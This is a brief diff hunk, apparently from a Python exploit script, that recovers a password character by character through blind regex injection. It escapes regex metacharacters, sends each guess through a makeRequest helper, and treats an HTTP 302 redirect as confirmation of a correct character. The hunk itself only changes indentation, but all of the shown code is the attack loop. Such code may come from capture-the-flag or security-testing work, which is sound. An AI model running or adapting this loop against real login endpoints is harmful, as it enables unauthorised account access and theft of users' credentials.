@@ -34,9 +34,9 @@ while loop<2:
   loop += 1
   for c in string.printable:
     if c not in ['*','+','.','?','|', '#', '&', '$']:
-          tpassword=password+c
+      tpassword=password+c
     else:
-          tpassword=password+'\\'+c
+      tpassword=password+'\\'+c
     r=makeRequest(tpassword)
     if r.status_code == 302:
       password += c
